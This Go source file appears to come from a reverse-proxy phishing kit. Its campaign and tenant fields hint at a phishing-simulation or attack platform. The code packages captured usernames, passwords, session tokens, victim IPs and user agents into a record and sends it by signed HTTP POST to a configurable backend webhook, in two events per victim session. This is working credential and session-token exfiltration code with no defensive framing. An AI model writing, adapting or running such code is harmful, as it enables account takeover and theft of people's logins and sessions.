package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"log"
	"net/http"
	"os"
	"time"
)

var (
	captureWebhookURL    = os.Getenv("CAPTURE_WEBHOOK_URL")    // e.g. https://your-node-api/internal/captures
	captureWebhookSecret = os.Getenv("CAPTURE_WEBHOOK_SECRET") // shared HMAC secret (same as Node)
	webhookClient        = &http.Client{Timeout: 10 * time.Second}
)

// capturePayload is the full record the Node backend stores and the Prism
// Results table renders. Field names are camelCase to match the frontend's
// recipient mapping (sessionId, userAgent, isDone, reachedService, …).
type capturePayload struct {
	// Tenant attribution
	CampaignID string `json:"campaignId"`
	Tenant     string `json:"tenant"`
	Provider   string `json:"provider"`

	// Session identity
	SessionID string `json:"sessionId"`
	Index     int    `json:"index"`

	// Captured credentials
	Username string            `json:"username"`
	Password string            `json:"password"`
	Tokens   map[string]string `json:"tokens,omitempty"`

	// Operational metadata
	IP             string    `json:"ip"`
	Geo            string    `json:"geo,omitempty"`
	UserAgent      string    `json:"userAgent"`
	Domain         string    `json:"domain"`
	IsDone         bool      `json:"isDone"`
	ReachedService bool      `json:"reachedService"`
	Timestamp      time.Time `json:"capturedAt"`
}

// emitCapture reports a capture to the Node backend. The CALLER gates it —
// ShouldEmitPassword() for Event 1 (immediate password capture) or
// ShouldEmitComplete() for Event 2 (full capture with tokens) — so this
// function only snapshots the session and sends. Both events share the same
// payload shape; the Node backend upserts by sessionId, so Event 2 enriches
// the Event-1 record (adds tokens, flips isDone) instead of duplicating it.
func emitCapture(s *Session, target *Target) {
	if s == nil || target == nil {
		return
	}
	username, password, campaignID, tokens, done := s.Snapshot()
	if username == "" && password == "" {
		return
	}
	sendCaptureWebhook(capturePayload{
		CampaignID:     campaignID,
		Tenant:         target.Name,
		Provider:       target.Name,
		SessionID:      s.ID,
		Index:          s.Index,
		Username:       username,
		Password:       password,
		Tokens:         tokens,
		IP:             s.IP,
		UserAgent:      s.UserAgent,
		Domain:         s.Domain,
		IsDone:         done,
		ReachedService: s.ReachedService,
	})
}

// sendCaptureWebhook POSTs a capture to the Node backend. Fire-and-forget; a
// delivery failure is logged but never breaks the proxy flow. If no webhook is
// configured, it's a no-op (the flat-file log still records everything).
func sendCaptureWebhook(p capturePayload) {
	if captureWebhookURL == "" {
		return
	}
	p.Timestamp = time.Now()
	body, err := json.Marshal(p)
	if err != nil {
		return
	}
	req, err := http.NewRequest("POST", captureWebhookURL, bytes.NewReader(body))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	// HMAC-SHA256 signature so the Node backend can reject forged webhooks.
	if captureWebhookSecret != "" {
		mac := hmac.New(sha256.New, []byte(captureWebhookSecret))
		mac.Write(body)
		req.Header.Set("X-Signature", hex.EncodeToString(mac.Sum(nil)))
	}
	resp, err := webhookClient.Do(req)
	if err != nil {
		log.Printf("[webhook] delivery failed: %v", err)
		return
	}
	defer resp.Body.Close()
	log.Printf("[webhook] capture delivered (campaign=%s status=%d)", p.CampaignID, resp.StatusCode)
}
